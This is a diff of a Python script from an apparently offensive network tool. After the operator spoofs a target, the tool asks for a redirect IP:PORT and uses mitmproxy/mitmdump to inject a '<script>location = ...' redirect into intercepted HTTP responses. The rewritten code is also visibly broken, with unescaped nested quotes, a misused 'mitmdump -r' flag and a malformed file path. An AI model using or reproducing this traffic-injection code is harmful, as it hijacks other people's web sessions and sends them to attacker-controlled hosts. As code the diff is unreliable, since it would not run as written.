@@ -6,7 +6,6 @@ import sys, traceback
 import os
 import subprocess as sp
 import time
-import mitmproxy
 
 # Start banner
 os.system("cat src/banner.txt | lolcat")
@@ -78,10 +77,18 @@ def main():
                 open('src/target.txt', 'w').close()
  
         def redirectlog():
-            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31;Please be sure to run htspoof on your target before setting your redirect IP")
+            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31; Please be sure to run htspoof on your target before setting your redirect IP")
             spoofip = input("\n"" " "\u001b[34;1mEnter the IP address to redirect to (IP:PORT): ")
-            def response(flow):
-                flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://"+spoofip+"</script>")
+            dumpcommand = "flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = f'http://{spoofip}</script>'")"
+            print(dumpcommand)
+
+            with open('src/dumpscript.py', 'w') as dumpscript:
+                dumpscript.write(dumpcommand)
+                try:
+                    os.popen("mitmdump -r src/dumpscript.py").read()
+                    open('src/dumpscript.py/','w').close()
+                except:
+                    print("Mitmdump error")
 
         def portal():
             return 0
